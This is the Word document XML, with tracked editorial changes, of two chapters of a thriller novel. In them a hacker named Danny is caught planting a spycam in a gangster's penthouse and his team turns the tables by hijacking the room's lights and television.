          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>’s gale</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> died</w:t>
      </w:r>
      <w:r w:rsidR="003C5048">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, bequeathing</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003C5048">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidR="003C5048">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ter</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> stillness </w:t>
      </w:r>
      <w:r w:rsidR="003C5048">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the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climbed down from the chair. “Well, it appears my work here</w:t>
      </w:r>
      <w:ins w:id="2813" w:author="TextVet" w:date="2016-03-28T11:16:00Z">
        <w:r w:rsidR="004122CF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2814" w:author="TextVet" w:date="2016-03-28T11:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004122CF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> i</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s done. Have a good day, gentlemen.” He gave Ivan a courteous nod. The balconyfolk began </w:t>
      </w:r>
      <w:del w:id="2815" w:author="TextVet" w:date="2016-03-28T11:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004122CF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fil</w:t>
      </w:r>
      <w:ins w:id="2816" w:author="TextVet" w:date="2016-03-28T11:16:00Z">
        <w:r w:rsidR="004122CF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2817" w:author="TextVet" w:date="2016-03-28T11:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004122CF">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xml:space="preserve"> back inside.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w:t>
      </w:r>
      <w:r w:rsidR="00384055">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> suppressed the</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> urge to sprint </w:t>
      </w:r>
      <w:r w:rsidR="00384055">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the room, </w:t>
      </w:r>
      <w:r w:rsidR="00384055">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">policing his nerves in the name of </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">professional </w:t>
      </w:r>
      <w:ins w:id="2818" w:author="TextVet" w:date="2016-03-28T11:19:00Z">
        <w:r w:rsidR="003E0891">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>façade, and survival</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:del w:id="2819" w:author="TextVet" w:date="2016-03-28T11:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F66F88">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>W</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2820" w:author="TextVet" w:date="2016-03-28T11:19:00Z">
        <w:r w:rsidR="00F66F88">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2821" w:author="TextVet" w:date="2016-03-28T11:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F66F88">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ith t</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>oolbox in hand, he walked calmly toward the large cedarwood doors that stood between him and the penthouse anteroom.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he had almost reached it before he heard a sound behind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sound was a metallic creak. It was followed by a clanking crash.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turned around.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air vent gaped exposed and uncovered in the wall, revealing a naked wad of Sticky Tack inside the shaft. On the floor beneath it, the faceplate lay upon the carpeting, beside a few loose screws. Near it was the small black wireless spycam.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For one silent second, both Danny and Ivan stared dumbly at the pile, saying nothing.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bolted for the door as Ivan shouted orders to his men. Danny’s fingers reached for the handle, but before they made contact he was pulled backward by his shirt. A wiry, muscular arm curled around his neck like a python, and he felt himself getting shoved back into the room. Someone kicked him forward, toward the grey figure of Ivan Zheleznov.</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lithe man who had greeted Danny at the door earlier now stood next to Ivan. He pulled a small black semi-automatic from his pocket, and pressed it to Danny’s chest. Danny felt his heart beat against the barrel. The mercenary slowly walked Danny down the steps of the sunken living room, where Danny found himself surrounded by Ivan’s men. The video game on the large television was paused — and while the digital images of gunmen stood frozen on the screen, real ones pointed their weapons at him from all directions.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the Bluetooth earpiece, Mike said, “Danny! What’s happening?”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Ivan hissed at him, “Do you thinking we are amateurs? A video camera bug in </w:t>
      </w:r>
      <w:commentRangeStart w:id="2822"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2822"/>
      <w:r w:rsidR="00357EEE">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2822"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> air vent! Is insult to the intelligence.”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squared his shoulders. He gulped hard, knowing that a convincing feint of bravado would be his only chance of survival. “I’m only here for the girl,” he said. “Hand her over and no harm will come to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burst out laughing. “No harm come to me?” The mercenaries joined Ivan in laughter.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the earpiece, Danny heard his team panicking. “Sergey! Bail him out! Bail him out right now!” said Mike. Sergey replied, “We are not anywhere nearby. Eugene is needing time to get into position. He must stall.”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as much strength as he could conjure, Danny said, “We’re willing to negotiate.”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Still chuckling, Ivan said, “Yes, I sure you are. You working for Sergey. I know this already. It is surprising, really. This…” He gestured with the spycam. “This not style of Sergey. Sergey, he more like, ‘Rahhhh! March! Go!’ Punch, kick, boom boomboom. You understand? This, this is more thinking, more like the chess. Maybe Sergey learning something as he getting older.”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Bluetooth headset buzzed with the voices of Danny’s cohorts. “We can’t just sit here!” Tina insisted. Mike replied, “There’s only one option! Have we finished isolating the X10 controllers?”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knew what his team was trying to do. With the gun still pressed to his chest, Danny mumbled, “I didn’t intend to be in the room for this. But I guess it doesn’t matter now, does it?” He looked at Ivan defiantly and said, “So, are you ready to start making a deal?”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smirked. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Deal</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>? Here making ‘deal’. We killing you soon, but not right now. First we having with you a little ‘conversation’. This man here, he is expert at having ‘conversations’ like this.” Ivan gestured to the lithe man holding the gun at Danny’s ribs. The man grunted happily. “You will telling us everything about where is Sergey and how you working with him. Then, when you done telling us, we finally letting you die. That is ‘deal’, understand?”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the earpiece, Mike said, “X10 packet injection check, receiver firmware mod check… Let’s do it already!”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leaned toward Danny. “Ah, so quiet! You having no last words?”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diabolical smile crept onto Danny’s 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a blink, the room lights died. The suite went dark, save for the glow from the plasma TV. Its image flicked to an online banking interface, logged in to a corporate account. The ledger was listed in euros, and showed a balance of seven figures. Across the top, in both Russian and English, it displayed the title, “Zheleznov Consortium Holdings”.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the light of the television screen, with every gun in the room pointed at him, Danny looked Ivan in the eyes and grinned.</w:t>
      </w:r>
      <w:ins w:id="2823" w:author="TextVet" w:date="2016-03-28T11:25:00Z">
        <w:r w:rsidR="00D83259">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“Actually, yeah. I’ve got a few things to say.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>28</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mercenaries stared at the screen</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, murmuring. Ivan barked at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interrupted, “He’s finished! As of right now, he has no money and no power. He’s nothing but a penniless old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stared at him through narrowed, wrinkly eyes. “You are such idiot. You think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is all my money?” He pointed at the bank balance on the screen. “That is </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pocket change</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>! That is one weekend gambling in Monaco! You think you stealing this one account making me ‘penniless’?”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Danny said slowly. “I’m not talking about the account. What I’m talking about, Ivan, is your business ventures.”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television flashed. The image cut to a pie chart overlaid on a map of Eastern Europe. One small pink wedge was marked with a pin-up silhouette; a steel-gray section showed a handgun; a brown slice bore a hypodermic needle. But by far the largest wedge, taking up over half the pie, was colored white, </w:t>
      </w:r>
      <w:ins w:id="2824" w:author="TextVet" w:date="2016-03-28T11:29:00Z">
        <w:r w:rsidR="00EC184B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>flanked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2825" w:author="TextVet" w:date="2016-03-28T11:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EC184B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>beside</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2826" w:author="TextVet" w:date="2016-03-28T11:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BF07AF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>d</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a line of cocaine.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“We’ve examined your finances, Ivan,” </w:t>
      </w:r>
      <w:ins w:id="2827" w:author="TextVet" w:date="2016-03-28T11:29:00Z">
        <w:r w:rsidR="009E1F90">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>as</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:ins w:id="2828" w:author="TextVet" w:date="2016-03-28T11:29:00Z">
        <w:r w:rsidR="009E1F90">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ure</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2829" w:author="TextVet" w:date="2016-03-28T11:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009E1F90">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ai</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d Danny. “This is the breakdown of your revenue. There’s the usual </w:t>
      </w:r>
      <w:commentRangeStart w:id="2830"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&amp;mdas</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2830"/>
      <w:r w:rsidR="00793EEF">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2830"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>; sex trafficking, arms trading. But most of your income is from drugs — specifically, cocaine. And so it appears, Ivan, that you have made…”</w:t>
      </w:r>
      <w:ins w:id="2831" w:author="TextVet" w:date="2016-03-28T11:31:00Z">
        <w:r w:rsidR="00794D24">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2832" w:author="TextVet" w:date="2016-03-28T11:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00794D24">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The screen cut to a photograph of the Tungsten Medical Technologies building.</w:t>
      </w:r>
      <w:ins w:id="2833" w:author="TextVet" w:date="2016-03-28T11:31:00Z">
        <w:r w:rsidR="00794D24">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2834" w:author="TextVet" w:date="2016-03-28T11:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00794D24">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 very poor investment decision.”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laughed dryly. “You know so little!” He reached into his chest pocket and produced the small translucent smiley-faced Eppendorf vial. “Tungsten is best investment I ever make!”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“There’s something I’d like to show you,” said Danny. “It’s inside my toolbox.”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Ivan spoke a few gruff words to a nearby bodyguard. The man yanked the box from Danny, set it down on the coffee table, and cautiously unbuckled the lid. Slowly, he drew from the box a small translucent Eppendorf vial filled with pale brown goo.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other men crowded in to take a closer look. Their eyes shifted between the vial in Ivan’s hand and the one pulled from the box.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 them around,” Danny said pleasantly. “I brought enough for everybody.”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bodyguard pulled out another Eppendorf vial, identical to the first. Then another. And another.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“Each one is cloned directly from that batch you’re holding in your hand,” Danny explained. “You’re a businessman, Ivan. You saw this genetic engineering project as a chance to control your entire supply chain, without having to depend on manufacturers in South America. That’s why you had Tungsten create this bacterium — to produce a source of cocaine that’s portable, durable, and easily replaced. Well, guess what, Ivan? You wanted ‘easily replaced’? You got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“See, we in the technology industry have a name for what you’ve done</w:t>
      </w:r>
      <w:ins w:id="2835" w:author="TextVet" w:date="2016-03-28T11:33:00Z">
        <w:r w:rsidR="008B5D46">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2836" w:author="TextVet" w:date="2016-03-28T11:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008B5D46">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837" w:author="TextVet" w:date="2016-03-28T11:33:00Z">
        <w:r w:rsidR="00A7580B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>d</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2838" w:author="TextVet" w:date="2016-03-28T11:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A7580B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>D</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>isruptive innovation’. It’s a creation whose very existence completely changes the marketplace forever.”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screen filled with a collage of images: a printing press, a flint</w:t>
      </w:r>
      <w:del w:id="2839" w:author="TextVet" w:date="2016-03-28T11:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AE5A30">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lock firearm, a light bulb, a Model T Ford, an airplane, a nuclear explosion, an IBM mainframe computer, an iPhone. The photograph of the Eppendorf vial with the Tungsten logo floated in a corner.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“Here’s the bittersweet secret about the tech world,” Danny continued. “Those of us who help overturn outdated methods and old paradigms render ourselves obsolete by our own innovations. We find ourselves at a competitive disadvantage against younger, fresher minds — minds that are uncluttered by knowledge of derelict systems that we had to learn in order to replace. The youth that follow will only know the world we have made for them; they will never know the world we came from. The pinnacle of our achievements, the greatest heights to which we can climb, will for them be merely their starting point. They will take for granted our lifetimes of work and claim it as their birthright. They’ll use our own accomplishments to leave us in the dust. The world </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>moves on — and it does so because we </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>make</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> it move on. Because, as a technologist, that’s the whole point.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now, Ivan… Take a look at what the youth of today are doing with </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>your</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> accomplishments right this minute.”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On the television screen appeared a YouTube video page. The frame showed a </w:t>
      </w:r>
      <w:ins w:id="2840" w:author="TextVet" w:date="2016-03-28T11:36:00Z">
        <w:r w:rsidR="00FC06D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2841" w:author="TextVet" w:date="2016-03-28T11:36:00Z">
